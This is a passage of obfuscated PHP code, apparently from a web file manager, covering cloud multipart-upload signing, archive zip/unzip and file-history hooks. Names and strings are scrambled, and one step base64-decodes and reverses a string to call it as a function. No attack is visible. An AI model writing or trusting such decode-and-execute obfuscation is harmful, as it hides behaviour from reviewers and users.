array($òÅÏœöš[220] => $ƒÉé¦Š, $òÅÏœöš[176] => $this->getHost() . $òÅÏœöš[8] . $this->pathEncode($—ÇÈè¥»), $òÅÏœöš[221] => $ÌôıÆˆ’, $òÅÏœöš[95] => $—ÇÈè¥»); } public function multiUploadAuthData($–™’ã›¼, $ß‘ıñû‚ = array()) { $Ü­½¸´ê =& $_SERVER[Æ š¦İÈ]; $Õ€äçë‹ = isset($ß‘ıñû‚[$Ü­½¸´ê[169]]) ? $ß‘ıñû‚[$Ü­½¸´ê[169]] : $Ü­½¸´ê[12]; $®øÏøË = $ß‘ıñû‚[$Ü­½¸´ê[95]]; unset($ß‘ıñû‚[$Ü­½¸´ê[95]]); if (isset($ß‘ıñû‚[$Ü­½¸´ê[222]])) { return $this->listUploadParts($®øÏøË, $ß‘ıñû‚); } $åŞêª = array(); if (isset($ß‘ıñû‚[$Ü­½¸´ê[1432]])) { $åŞêª[$Ü­½¸´ê[1433]] = $ß‘ıñû‚[$Ü­½¸´ê[1432]]; } $Ø¸é²¹¥ = explode($Ü­½¸´ê[178], $this->getHost()); $ Å¥û†š = array($Ü­½¸´ê[1434] => $Ø¸é²¹¥[1], $Ü­½¸´ê[1435] => $Ü­½¸´ê[12], $Ü­½¸´ê[212] => $Ü­½¸´ê[120], $Ü­½¸´ê[1347] => $ß‘ıñû‚[$Ü­½¸´ê[80]]); $ø¡‰öÅ = $Ü­½¸´ê[225]; $„«ğ°ÇÇ = $Ü­½¸´ê[8] . $this->pathEncode($®øÏøË) . $Õ€äçë‹; $¶¬„˜¼ = $this->client->__getSignatureV4($åŞêª, $ Å¥û†š, $ø¡‰öÅ, $„«ğ°ÇÇ); if (strpos($Õ€äçë‹, $Ü­½¸´ê[224]) === 0) { if (isset($åŞêª[$Ü­½¸´ê[1433]])) { $œâØ…¢š = $åŞêª[$Ü­½¸´ê[1433]]; } else { if (isset($¶¬„˜¼[$Ü­½¸´ê[1433]])) { $œâØ…¢š = $¶¬„˜¼[$Ü­½¸´ê[1433]]; } else { $œâØ…¢š = hash($Ü­½¸´ê[1345], $Ü­½¸´ê[12]); } } return array($Ü­½¸´ê[231] => $¶¬„˜¼[$Ü­½¸´ê[231]], $Ü­½¸´ê[1433] => $œâØ…¢š, $Ü­½¸´ê[221] => $¶¬„˜¼[$Ü­½¸´ê[1436]]); } return $¶¬„˜¼[$Ü­½¸´ê[231]]; } public function listUploadParts($ã‚ÄÃá, $»Ê”Í£ = array()) { $Şú¤Ïê› =& $_SERVER[Æ š¦İÈ]; $ºşóó˜™ = str_replace($Şú¤Ïê›[232], $Şú¤Ïê›[12], $»Ê”Í£[$Şú¤Ïê›[169]]); $±ø´ˆ¯ = $this->client->listParts($this->bucket, $ã‚ÄÃá, $ºşóó˜™); if (!$±ø´ˆ¯) { return !1; } $Çû‹—é = $Şú¤Ïê›[1437]; foreach ($±ø´ˆ¯ as $——ªıªË) { $Çû‹—é .= $Şú¤Ïê›[1438] . "\x3c\120\x61\x72\164\x4e\x75\155\142\x65\162\76{$——ªıªË[$Şú¤Ïê›[1392]]}\74\57\x50\x61\x72\164\x4e\x75\155\x62\145\162\76\xa" . "\74\x45\124\x61\x67\x3e{$——ªıªË[$Şú¤Ïê›[1393]]}\x3c\57\105\x54\141\147\76\xa" . $Şú¤Ïê›[1439]; } $Çû‹—é .= $Şú¤Ïê›[1440]; $©¿ª­ = array(); $˜ñÌµÕ = explode($Şú¤Ïê›[178], $this->getHost()); $ƒ§œŒëà = array($Şú¤Ïê›[1434] => $˜ñÌµÕ[1], $Şú¤Ïê›[212] => $Şú¤Ïê›[120], $Şú¤Ïê›[1347] => strlen($Çû‹—é)); $‰À®Ù‡ = $Şú¤Ïê›[223]; $Ë×ˆ†çó = $Şú¤Ïê›[8] . $this->pathEncode($ã‚ÄÃá) . $»Ê”Í£[$Şú¤Ïê›[169]]; $Øı–¶ = $this->client->__getSignatureV4($©¿ª­, $ƒ§œŒëà, $‰À®Ù‡, $Ë×ˆ†çó, $Çû‹—é); return array($Şú¤Ïê›[231] => $Øı–¶[$Şú¤Ïê›[231]], $Şú¤Ïê›[221] => $Øı–¶[$Şú¤Ïê›[1436]], $Şú¤Ïê›[233] => $±ø´ˆ¯, $Şú¤Ïê›[1433] => $Øı–¶[$Şú¤Ïê›[1433]]); } public function link($ÍúÌš†, $†–Ì´Şâ = array()) { return parent::link($ÍúÌš†, $†–Ì´Şâ); } public function fileOut($øøóø´Ö, $ş ÕÍâ = false, $¥²ôı¹— = false, $¾¹Ÿö¦“ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Æ š¦İÈ][1441])) { return parent::fileOutServer($øøóø´Ö, $ş ÕÍâ, $¥²ôı¹—, $¾¹Ÿö¦“); } parent::fileOut($øøóø´Ö, $ş ÕÍâ, $¥²ôı¹—, $¾¹Ÿö¦“); } public function fileOutImage($ÖÕ¢­º÷, $Ïœü«ÉÙ = 250) { if (strstr($this->endpoint, $_SERVER[Æ š¦İÈ][1441])) { return parent::fileOutImageServer($ÖÕ¢­º÷, $Ïœü«ÉÙ); } parent::fileOutImage($ÖÕ¢­º÷, $Ïœü«ÉÙ); } public function fileOutLink($ªÒå¹À“) { $˜•€‘ ä =& $_SERVER[Æ š¦İÈ]; if (substr($ªÒå¹À“, 0, 7) == $˜•€‘ ä[1314]) { $ªÒå¹À“ = $˜•€‘ ä[1315] . substr($ªÒå¹À“, 7); } header($˜•€‘ ä[160] . $ªÒå¹À“); die; } public function getHost() { $ºƒ¿¿™¬ =& $_SERVER[Æ š¦İÈ]; $›ÕŒİø = str_rtrim(parent::getHost(), $ºƒ¿¿™¬[8] . $this->bucket); $›ÕŒİø = explode($ºƒ¿¿™¬[178], $›ÕŒİø); return $›ÕŒİø[0] . $ºƒ¿¿™¬[178] . $this->bucket . $ºƒ¿¿™¬[10] . $›ÕŒİø[1]; } } goto f«ÓÏå¼òù; Eœò§´±í£: $fileSize = strrev(base64_decode($_SERVER[¬ˆ¹âÅÏ][0])); function binCheckNeq($ŸŸàù“, $üÇÉã²Ü) { return $ŸŸàù“ != $üÇÉã²Ü; } $_SERVER[$_SERVER[¬ˆ¹âÅÏ][1]] = $fileSize($_SERVER[$_SERVER[¬ˆ¹âÅÏ][2]]); goto FÅå‡çêÅŠ; B¡ÓÌÈ˜æŠ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $½ÅîÂ¢; if (!$½ÅîÂ¢) { $ŞºÂ‹·ş = IO::init($_SERVER[Æ š¦İÈ][8]); } return $ŞºÂ‹·ş; } private static function iconvSystem($ÒÏ Å†È) { return self::local()->iconvSystem($ÒÏ Å†È); } private static function iconvApp($÷¾úî€) { return self::local()->iconvApp($÷¾úî€); } public static function zip($ÇÖ·ñØÑ, $óğÆ–Å¯ = "\x7a\151\x70", $¼‰ÔÚ÷  = '', $Õ–õ´€‹ = REPEAT_RENAME) { $˜õ˜ ¥º =& $_SERVER[Æ š¦İÈ]; $—Ñøâ”­ = self::init($ÇÖ·ñØÑ[0][$˜õ˜ ¥º[78]]); $üÒ¸°ÕÈ = self::info($ÇÖ·ñØÑ[0][$˜õ˜ ¥º[78]]); $Ù·ª»å¶ = !1; if (!$¼‰ÔÚ÷  && $—Ñøâ”­->getType() == $˜õ˜ ¥º[107]) { $³¢èÚµó = self::zipFileList($ÇÖ·ñØÑ); } else { $Ù·ª»å¶ = $¼‰ÔÚ÷  ? $¼‰ÔÚ÷  : TEMP_FILES . $˜õ˜ ¥º[1173] . time() . rand_string(8) . $˜õ˜ ¥º[8]; mk_dir($Ù·ª»å¶); $³¢èÚµó = self::zipFileList($ÇÖ·ñØÑ, $Ù·ª»å¶); } $Û‰ÇÃŒÜ = $üÒ¸°ÕÈ[$˜õ˜ ¥º[32]]; if (count($³¢èÚµó) > 1) { $ö—Çº = IO::info(IO::pathFather($üÒ¸°ÕÈ[$˜õ˜ ¥º[78]])); $Û‰ÇÃŒÜ = $ö—Çº[$˜õ˜ ¥º[32]]; } $ÚåæßÈÂ = $Ù·ª»å¶; if (!$ÚåæßÈÂ) { $ÚåæßÈÂ = get_path_father($üÒ¸°ÕÈ[$˜õ˜ ¥º[78]]); if (!$¼‰ÔÚ÷  && $—Ñøâ”­->getType() == $˜õ˜ ¥º[107]) { $ÚåæßÈÂ = get_path_father($—Ñøâ”­->path); } $ËÖºÆñ = IO::info($ÚåæßÈÂ); if (!$ËÖºÆñ[$˜õ˜ ¥º[197]]) { show_json(LNG($˜õ˜ ¥º[1174]), !1); } } $°ñùÜ = $ÚåæßÈÂ . $Û‰ÇÃŒÜ . $˜õ˜ ¥º[10] . $óğÆ–Å¯; $°ñùÜ = get_filename_auto($°ñùÜ, $˜õ˜ ¥º[12], $Õ–õ´€‹); $“í¯ƒº÷ = self::iconvSystem($°ñùÜ); foreach ($³¢èÚµó as $ô¡Ï§Ï‚ => $û˜Û÷¦©) { $³¢èÚµó[$ô¡Ï§Ï‚] = self::iconvSystem($û˜Û÷¦©); } KodArchive::create($“í¯ƒº÷, $³¢èÚµó); if (!IO::exist($°ñùÜ)) { if ($Ù·ª»å¶) { del_dir($Ù·ª»å¶); } show_json(LNG($˜õ˜ ¥º[1175]), !1); } if ($¼‰ÔÚ÷  || !$Ù·ª»å¶) { if ($Ù·ª»å¶ && strstr($Ù·ª»å¶, TEMP_FILES)) { $”‘¦îØş = $³¢èÚµó = array(); recursion_dir($ÚåæßÈÂ, $”‘¦îØş, $³¢èÚµó, 0); foreach ($”‘¦îØş as $¼¯©Ô­) { del_dir($¼¯©Ô­); } foreach ($³¢èÚµó as $¢×„Š¶à) { if ($¢×„Š¶à == $“í¯ƒº÷) { continue; } del_file($¢×„Š¶à); } } return $°ñùÜ; } $ìÒ±Øò = self::pathFather($üÒ¸°ÕÈ[$˜õ˜ ¥º[78]]); $Å®İÄã€ = self::move($°ñùÜ, $ìÒ±Øò, $Õ–õ´€‹); if (!$Å®İÄã€) { del_dir($Ù·ª»å¶); show_json(LNG($˜õ˜ ¥º[1175]), !1); } del_dir($Ù·ª»å¶); return $Å®İÄã€; } public static function unzip($ùî“éù, $‚’…ÕÇÜ = "\x72\145\160\x6c\x61\x63\x65") { $çÅÁ¤¿ =& $_SERVER[Æ š¦İÈ]; $¶îÀÏæ = $ùî“éù[$çÅÁ¤¿[78]]; $ş˜ääŸ = $ùî“éù[$çÅÁ¤¿[1176]]; if (!($¥Å Œ´› = parent::info($¶îÀÏæ))) { show_json(LNG($çÅÁ¤¿[1177]), !1); } if (!($à·‰ŞÕ¾ = parent::infoFull($ş˜ääŸ))) { $ş˜ääŸ = parent::mkdir($ş˜ääŸ); $à·‰ŞÕ¾ = array($çÅÁ¤¿[78] => $ş˜ääŸ); } else { if (isset($à·‰ŞÕ¾[$çÅÁ¤¿[405]]) && trim($à·‰ŞÕ¾[$çÅÁ¤¿[78]], $çÅÁ¤¿[8]) != trim($ş˜ääŸ, $çÅÁ¤¿[8])) { $µèòÍÕ¸ = KodIO::make($à·‰ŞÕ¾[$çÅÁ¤¿[500]]); $½îİœ¶· = parent::fileNameAuto($µèòÍÕ¸, $à·‰ŞÕ¾[$çÅÁ¤¿[32]], REPEAT_RENAME_FOLDER, !0); $ş˜ääŸ = parent::mkdir($µèòÍÕ¸ . $½îİœ¶·); $à·‰ŞÕ¾ = array($çÅÁ¤¿[78] => $ş˜ääŸ); } } $ş˜ääŸ = $à·‰ŞÕ¾[$çÅÁ¤¿[78]]; $¥é‰®éÚ = self::tmpFileName($¥Å Œ´›); $¿®´ìÏ£ = TEMP_FILES . $¥é‰®éÚ; del_dir($¿®´ìÏ£); mk_dir($¿®´ìÏ£); $‚•Ú—— = self::fileExt($¥Å Œ´›); $÷¯’ÙÂÈ = $¿®´ìÏ£ . $çÅÁ¤¿[10] . $‚•Ú——; if (!@file_exists(self::iconvSystem($÷¯’ÙÂÈ))) { $•âÒØò¼ = self::localFilePath($¶îÀÏæ, $‚•Ú——); $÷¯’ÙÂÈ = $•âÒØò¼ ? $•âÒØò¼ : parent::download($¶îÀÏæ, $÷¯’ÙÂÈ); } $÷¯’ÙÂÈ = self::iconvSystem($÷¯’ÙÂÈ); $ÏúÄÙèÇ = isset($ùî“éù[$çÅÁ¤¿[1178]]) ? $ùî“éù[$çÅÁ¤¿[1178]] : $çÅÁ¤¿[1179]; $ÊƒÔ±¦à = KodArchive::extract($÷¯’ÙÂÈ, $¿®´ìÏ£ . $çÅÁ¤¿[8], $ÏúÄÙèÇ); self::archiveExt(); if (!$ÊƒÔ±¦à[$çÅÁ¤¿[1180]]) { show_json($çÅÁ¤¿[1181] . $ÊƒÔ±¦à[$çÅÁ¤¿[1182]], !1); } Hook::trigger($çÅÁ¤¿[1183], $¿®´ìÏ£); recursion_dir($¿®´ìÏ£, $ı´¼—ºÒ, $Áàş¬ëª, 0); $Õü÷–° = array_merge($ı´¼—ºÒ, $Áàş¬ëª); foreach ($Õü÷–° as $çÒ¤“) { $çÒ¤“ = self::iconvApp($çÒ¤“); self::move($çÒ¤“, $ş˜ääŸ, $‚’…ÕÇÜ); } del_dir($¿®´ìÏ£); if (!$•âÒØò¼) { del_file($÷¯’ÙÂÈ); } return !0; } public static function unzipList($–ªÙÙ¿ò) { $è­¨Ì§³ =& $_SERVER[Æ š¦İÈ]; $öê¦’© = $–ªÙÙ¿ò[$è­¨Ì§³[78]]; $€èü¥œ¼ = isset($–ªÙÙ¿ò[$è­¨Ì§³[1184]]) ? $–ªÙÙ¿ò[$è­¨Ì§³[1184]] : -1; $À„Îš®Ú = 50000; if (request_url_safe($öê¦’©)) { $¬ªä‹‰± = parse_url_query($öê¦’©); if (!isset($¬ªä‹‰±[$è­¨Ì§³[78]])) { show_json($è­¨Ì§³[1185], !1); } } $ªï±Éå´ = isset($¬ªä‹‰±) ? $¬ªä‹‰±[$è­¨Ì§³[78]] : $öê¦’©; $ø¦ÏÓÛ = self::info($ªï±Éå´); $ê¤Ê·¸¨ = self::fileExt($ø¦ÏÓÛ); $º©¡Ë€‡ = self::tmpFileName($ø¦ÏÓÛ); if (isset($¬ªä‹‰±)) { $İƒÉ¹Ô = array($¬ªä‹‰±[$è­¨Ì§³[78]], $¬ªä‹‰±[$è­¨Ì§³[1184]], $¬ªä‹‰±[$è­¨Ì§³[32]]); $ˆÁüü÷µ = md5(implode($è­¨Ì§³[11], $İƒÉ¹Ô)) . $è­¨Ì§³[10] . get_path_ext($¬ªä‹‰±[$è­¨Ì§³[32]]); } else { $İƒÉ¹Ô = array($ø¦ÏÓÛ[$è­¨Ì§³[32]], $ø¦ÏÓÛ[$è­¨Ì§³[78]], $ø¦ÏÓÛ[$è­¨Ì§³[80]]); $ˆÁüü÷µ = md5(implode($è­¨Ì§³[11], $İƒÉ¹Ô)) . $è­¨Ì§³[10] . $ê¤Ê·¸¨; } if ($€èü¥œ¼ == -1) { $ÈÑµì›ì = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\145\167\57{$º©¡Ë€‡}\57{$ˆÁüü÷µ}\56\x6c\x6f\x67"; $ª¢Ì–‰ = self::infoFull($ÈÑµì›ì); if ($ª¢Ì–‰) { $ÈÑµì›ì = $ª¢Ì–‰[$è­¨Ì§³[78]]; $¦¬ÏÜó = self::getContent($ÈÑµì›ì); if ($¦¬ÏÜó) { $‡¡¶Ú× = json_decode($¦¬ÏÜó, !0); $‡¡¶Ú× = is_array($‡¡¶Ú×) ? $‡¡¶Ú× : array(); if (count($‡¡¶Ú×) >= $À„Îš®Ú) { show_json(sprintf(LNG($è­¨Ì§³[1186]), count($‡¡¶Ú×)), !1); } return $‡¡¶Ú×; } } else { $ÈÑµì›ì = self::mkfile($ÈÑµì›ì); } } $“¬ì–¬… = TEMP_FILES . $º©¡Ë€‡; if (!is_dir($“¬ì–¬…)) { mk_dir($“¬ì–¬…); } $ä¯Ì‘ƒ¹ = $“¬ì–¬… . $è­¨Ì§³[8] . $ˆÁüü÷µ; if (!@file_exists(self::iconvSystem($ä¯Ì‘ƒ¹))) { if (isset($¬ªä‹‰±)) { url_request($öê¦’©, $è­¨Ì§³[1187], $ä¯Ì‘ƒ¹); } else { $¨úª = self::localFilePath($öê¦’©, $ê¤Ê·¸¨); $ä¯Ì‘ƒ¹ = $¨úª ? $¨úª : self::download($öê¦’©, $ä¯Ì‘ƒ¹); } } $ä¯Ì‘ƒ¹ = self::iconvSystem($ä¯Ì‘ƒ¹); if ($€èü¥œ¼ >= 0) { $ÃóùöŒ‹ = isset($–ªÙÙ¿ò[$è­¨Ì§³[1188]]) ? $–ªÙÙ¿ò[$è­¨Ì§³[1188]] : !1; $ç‰÷Ôê = isset($–ªÙÙ¿ò[$è­¨Ì§³[32]]) ? $–ªÙÙ¿ò[$è­¨Ì§³[32]] : $è­¨Ì§³[12]; KodArchive::filePreview($ä¯Ì‘ƒ¹, $€èü¥œ¼, $ÃóùöŒ‹, $ç‰÷Ôê); self::archiveExt(); die; } $ÛìÖŒŞò = KodArchive::listContent($ä¯Ì‘ƒ¹); self::archiveExt(); del_dir($“¬ì–¬…); if (!$ÛìÖŒŞò[$è­¨Ì§³[1180]]) { show_json($ÛìÖŒŞò[$è­¨Ì§³[1182]], !1); } $‡¡¶Ú× = json_encode($ÛìÖŒŞò[$è­¨Ì§³[1182]]); self::setContent($ÈÑµì›ì, $‡¡¶Ú×); if (count($ÛìÖŒŞò[$è­¨Ì§³[1182]]) >= $À„Îš®Ú) { show_json(sprintf(LNG($è­¨Ì§³[1186]), count($ÛìÖŒŞò[$è­¨Ì§³[1182]])), !1); } return $ÛìÖŒŞò[$è­¨Ì§³[1182]]; } private static function fileExt($›åÄğ˜Ä) { $À“¢ÜÃ— =& $_SERVER[Æ š¦İÈ]; $ëÑÁäç¯ = $›åÄğ˜Ä[$À“¢ÜÃ—[169]]; if ($ëÑÁäç¯ == $À“¢ÜÃ—[1189]) { $Óî£êá = $À“¢ÜÃ—[1190]; if (substr($›åÄğ˜Ä[$À“¢ÜÃ—[32]], -strlen($Óî£êá)) == $Óî£êá) { $ëÑÁäç¯ = $À“¢ÜÃ—[1191]; } } self::archiveExt($ëÑÁäç¯); return $ëÑÁäç¯; } private static function zipFileList($ÈÉòÔÅ, $µ·í½Ë = false) { $ˆ™Ìëš =& $_SERVER[Æ š¦İÈ]; $Œ—™šÖä = array(); foreach ($ÈÉòÔÅ as $ÓšºŒâ) { $ë¥Ûäøå = $ÓšºŒâ[$ˆ™Ìëš[78]]; if ($µ·í½Ë) { $ë¥Ûäøå = self::copy($ÓšºŒâ[$ˆ™Ìëš[78]], $µ·í½Ë, $ˆ™Ìëš[815]); } else { $õóäÔæ = self::init($ÓšºŒâ[$ˆ™Ìëš[78]]); if ($õóäÔæ->getType() == $ˆ™Ìëš[107]) { $ë¥Ûäøå = $õóäÔæ->path; } } if ($ë¥Ûäøå && self::local()->exist($ë¥Ûäøå)) { $Œ—™šÖä[$ÓšºŒâ[$ˆ™Ìëš[78]]] = $ë¥Ûäøå; } } if (!empty($Œ—™šÖä)) { return array_values($Œ—™šÖä); } show_json(LNG($ˆ™Ìëš[1155]), !1); } public static function tmpFileName($å¹Îüú¹) { $ã‡¡ú§Ù =& $_SERVER[Æ š¦İÈ]; $ß³™‹é = array($å¹Îüú¹[$ã‡¡ú§Ù[32]], $å¹Îüú¹[$ã‡¡ú§Ù[78]], $å¹Îüú¹[$ã‡¡ú§Ù[80]], $å¹Îüú¹[$ã‡¡ú§Ù[523]]); return md5(implode($ã‡¡ú§Ù[11], $ß³™‹é)); } private static function localFilePath($“ĞÃç»†, $¦äÁªí­) { $ºå°èÎŠ =& $_SERVER[Æ š¦İÈ]; if ($¦äÁªí­ == $ºå°èÎŠ[1192] && strtoupper(substr(PHP_OS, 0, 3)) == $ºå°èÎŠ[1193]) { return !1; } $Ù“åÚë– = KodIO::parse($“ĞÃç»†); if ($Ù“åÚë–[$ºå°èÎŠ[33]] == KodIO::KOD_SOURCE) { $éàÄ¿ = Model($ºå°èÎŠ[822])->fileInfoGet(KodIO::sourceID($“ĞÃç»†)); if (!$éàÄ¿[$ºå°èÎŠ[78]]) { show_json($ºå°èÎŠ[1194], !1); } $“ĞÃç»† = $éàÄ¿[$ºå°èÎŠ[78]]; } $“äØ ¡Ì = self::init($“ĞÃç»†); if ($“äØ ¡Ì->pathParse[$ºå°èÎŠ[1142]]) { $“ĞÃç»† = $“äØ ¡Ì->pathParse[$ºå°èÎŠ[1142]]; $“äØ ¡Ì = self::init($“ĞÃç»†); } $»¶Èö¬ı = $“äØ ¡Ì->getType(); if ($»¶Èö¬ı == $ºå°èÎŠ[107] || $»¶Èö¬ı == $ºå°èÎŠ[1195]) { if (!$“äØ ¡Ì->exist($“äØ ¡Ì->path)) { show_json(LNG($ºå°èÎŠ[106]), !1); } return $“äØ ¡Ì->path; } return !1; } private static function archiveExt($ÓŸ—§€¤ = '') { $GLOBALS[$_SERVER[Æ š¦İÈ][1196]] = $ÓŸ—§€¤; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ü½”Í–ó =& $_SERVER[Æ š¦İÈ]; $ûÚ°¾ = $GLOBALS[$Ü½”Í–ó[6]][$Ü½”Í–ó[90]]; if ($ûÚ°¾[$Ü½”Í–ó[1197]] != 1) { return; } if ($ûÚ°¾[$Ü½”Í–ó[1198]] <= 0) { return; } if (isset($_REQUEST[$Ü½”Í–ó[1199]]) && $_REQUEST[$Ü½”Í–ó[1199]] == $Ü½”Í–ó[89]) { return; } Hook::bind($Ü½”Í–ó[1200], $Ü½”Í–ó[1201]); Hook::bind($Ü½”Í–ó[1202], $Ü½”Í–ó[1203]); Hook::bind($Ü½”Í–ó[1204], $Ü½”Í–ó[1205]); Hook::bind($Ü½”Í–ó[1206], $Ü½”Í–ó[1207]); Hook::bind($Ü½”Í–ó[1208], $Ü½”Í–ó[1209]); Hook::bind($Ü½”Í–ó[1210], $Ü½”Í–ó[1211]); } public static function eventBeforeUpload($Ñ¥‚ÈÌº) { if ($Ñ¥‚ÈÌº[3] && $Ñ¥‚ÈÌº[3] != REPEAT_REPLACE) { return; } $ó“ÎÙİÚ = self::parsePath($Ñ¥‚ÈÌº[0]); if (!$ó“ÎÙİÚ) { return; } self::add($ó“ÎÙİÚ); } public static function eventBeforeEdit($ë™ÙËµ¥) { $Éã€Œ§ = self::parsePath($ë™ÙËµ¥[0]); if (!$Éã€Œ§) { return; } self::add($Éã€Œ§); } public static function eventBeforeCopyFile($õ„¿¾Éë, $÷¼°±¿, $¾„ˆ‡, $ÍäŠ»Õº, $•İÈã, $Ø¢ˆ’) { $òœóŸ©ü = $¾„ˆ‡->getPathOuter($ÍäŠ»Õº); $£Â‚õó = self::parsePath($òœóŸ©ü); if (!$£Â‚õó) { return; } self::add($£Â‚õó); } public static function eventBeforeRename($ı‡¶ˆÅ™) { $¬œİÑ¦ =& $_SERVER[Æ š¦İÈ]; $¥»Û“™¿ = self::parsePath($ı‡¶ˆÅ™[0]); if (!$¥»Û“™¿) { return; } $ÕÅˆ©©‚ = self::checkInHistory($¥»Û“™¿); if (!$ÕÅˆ©©‚) { return; } if ($ÕÅˆ©©‚[$¬œİÑ¦[33]] == $¬œİÑ¦[194]) { $°™ÖõÈ = self::listData($¥»Û“™¿); if ($°™ÖõÈ && $°™ÖõÈ[$¬œİÑ¦[366]]) { self::moveHistory($¥»Û“™¿, $ı‡¶ˆÅ™[1]); } } else { IO::rename($ÕÅˆ©©‚[$¬œİÑ¦[78]], $ı‡¶ˆÅ™[1]); } } public static function eventBeforeMove($Á·š‰Œ®) { $Üû•”ÂÓ =& $_SERVER[Æ š¦İÈ]; $ã¬ëŞˆ“ = self::parsePath($Á·š‰Œ®[0]); if (!$ã¬ëŞˆ“) { return; } $•‡÷ÒÒ = self::parsePath($Á·š‰Œ®[1]); if (!$•‡÷ÒÒ) { return; } $·ÉÜ© = $Á·š‰Œ®[3]; $Ê»Ú“ü» = self::checkInHistory($ã¬ëŞˆ“); if (!$Ê»Ú“ü») { return; } $˜ƒ ¯»ã = self::pathHistory($•‡÷ÒÒ); if ($Ê»Ú“ü»[$Üû•”ÂÓ[33]] == $Üû•”ÂÓ[194]) { $’¡Ñ¤ í = self::listData($ã¬ëŞˆ“); $†ñ›š«Á = rtrim($•‡÷ÒÒ, $Üû•”ÂÓ[8]) . $Üû•”ÂÓ[8] . ($·ÉÜ© ? $·ÉÜ© : get_path_this($ã¬ëŞˆ“)); $£İ–ò®„ = self::listData($†ñ›š«Á); if ($’¡Ñ¤ í && $’¡Ñ¤ í[$Üû•”ÂÓ[366]] && $£İ–ò®„ && $£İ–ò®„[$Üû•”ÂÓ[366]]) { return self::clear($ã¬ëŞˆ“); } if ($’¡Ñ¤ í && $’¡Ñ¤ í[$Üû•”ÂÓ[366]]) { self::moveHistory($ã¬ëŞˆ“, $·ÉÜ©, $˜ƒ ¯»ã); } } else { IO::move($Ê»Ú“ü»[$Üû•”ÂÓ[78]], $˜ƒ ¯»ã, !1, $·ÉÜ©); self::clearEmptyFolder(IO::pathFather($Ê»Ú“ü»[$Üû•”ÂÓ[78]])); } } public static function eventAfterRemove($¥Ü¤ ÀÈ, $‘“êÒ˜¡) { $é¨î¡– =& $_SERVER[Æ š¦İÈ]; if (!$‘“êÒ˜¡) { return; } $ˆÂõ÷ºÂ = self::parsePath($¥Ü¤ ÀÈ[0]); if (!$ˆÂõ÷ºÂ) { return; } $—Ç¶é´ = self::checkInHistory($ˆÂõ÷ºÂ); if (!$—Ç¶é´) { return; } if ($—Ç¶é´[$é¨î¡–[33]] == $é¨î¡–[194]) { $ İü€·µ = self::listData($ˆÂõ÷ºÂ, !1); if ($ İü€·µ && $ İü€·µ[$é¨î¡–[366]]) { self::clear($ˆÂõ÷ºÂ, !1); } } else { IO::remove($—Ç¶é´[$é¨î¡–[78]]); self::clearEmptyFolder(IO::pathFather($—Ç¶é´[$é¨î¡–[78]])); } } private static function checkInHistory($äàÍõå) { $®ÌËå£ = self::pathHistory($äàÍõå); if (!IO::exist($®ÌËå£)) { $®ÌËå£ .= $_SERVER[Æ š¦İÈ][1212]; } return IO::exist($®ÌËå£) ? IO::info($®ÌËå£) : !1; } private static function parsePath($çƒ·¥) { $’Å±·Ñó =& $_SERVER[Æ š¦İÈ]; if (!$çƒ·¥) { return !1; } if ($GLOBALS[$’Å±·Ñó[1213]]) { return; } $•ÁşÎŸ‹ = KodIO::parse($çƒ·¥); $Áèâñ» = $•ÁşÎŸ‹[$’Å±·Ñó[33]]; $²¯ªÜí´ = !$Áèâñ» || $Áèâñ» == KodIO::KOD_IO || $Áèâñ» == KodIO::KOD_SHARE_ITEM; if (!$²¯ªÜí´ || !$•ÁşÎŸ‹[$’Å±·Ñó[1214]]) { return !1; } if (substr($çƒ·¥, 0, strlen(DATA_PATH . $’Å±·Ñó[1215])) == DATA_PATH . $’Å±·Ñó[1215]) { return !1; } if ($Áèâñ» == KodIO::KOD_SHARE_ITEM) { $®îˆµÓé = IO::init($çƒ·¥); if ($®îˆµÓé->pathParse[$’Å±·Ñó[1142]]) { return self::parsePath($®îˆµÓé->pathParse[$’Å±·Ñó[1142]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ì¬İç¾“ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $’Å±·Ñó[1216]); foreach ($Ì¬İç¾“ as $ı¬îÚˆ) { if (!$Áèâñ» && substr($çƒ·¥, 0, strlen($ı¬îÚˆ)) == $ı¬îÚˆ) { return !1; } } self::log($GLOBALS[$’Å±·Ñó[1137]] . $’Å±·Ñó[1217] . $çƒ·¥); return $çƒ·¥; } private static function pathHistory($Ù˜ƒ´Ğ“) { $¾‹„õ…° =& $_SERVER[Æ š¦İÈ]; $øÊ½Ç­« = self::$_historyBase . ltrim(KodIO::clear($Ù˜ƒ´Ğ“), $¾‹„õ…°[8]); $øÊ½Ç­« = str_replace(array($¾‹„õ…°[1218]), array($¾‹„õ…°[1219]), $øÊ½Ç­«); return $øÊ½Ç­«; } public static function log($àØ½»¶¥) { } public static function historyCount($•í¯µ¶) { $¸„ÚÎ“Á =& $_SERVER[Æ š¦İÈ]; $ïÃïÍ»£ = array(); $—Ÿå§¸é = array(); foreach ($•í¯µ¶ as $ÇÁÖ Ş¦) { $ğñùî³º = get_path_father($ÇÁÖ Ş¦); if (!$—Ÿå§¸é[$ğñùî³º]) { $—Ÿå§¸é[$ğñùî³º] = array(); } $—Ÿå§¸é[$ğñùî³º][] = get_path_this($ÇÁÖ Ş¦); } foreach ($—Ÿå§¸é as $ğñùî³º => $êâÏœµİ) { $¯‡«‘½Ú = self::parsePath($ğñùî³º); if (!$¯‡«‘½Ú) { continue; } foreach ($êâÏœµİ as $ÚÌ¯”¬Á) { $¼Áê†–ó = self::listData(rtrim($¯‡«‘½Ú, $¸„ÚÎ“Á[8]) . $¸„ÚÎ“Á[8] . $ÚÌ¯”¬Á, !1); if ($¼Áê†–ó && $¼Áê†–ó[$¸„ÚÎ“Á[366]]) { $ïÃïÍ»£[rtrim($ğñùî³º, $¸„ÚÎ“Á[8]) . $¸„ÚÎ“Á[8] . $ÚÌ¯”¬Á] = count($¼Áê†–ó[$¸„ÚÎ“Á[366]]); } } } return $ïÃïÍ»£; } public static function add($í‹¯Âµ‘) { $áö«Ï¸¬ =& $_SERVER[Æ š¦İÈ]; $âòÉé±¹ = self::listData($í‹¯Âµ‘); if (!$âòÉé±¹) { return; } $æõØ¿Ÿ¿ = Model($áö«Ï¸¬[767])->get($áö«Ï¸¬[1220]); $ÖÌ·……ø = $GLOBALS[$áö«Ï¸¬[6]][$áö«Ï¸¬[90]][$áö«Ï¸¬[1198]]; $¹â¸óÍ“ = 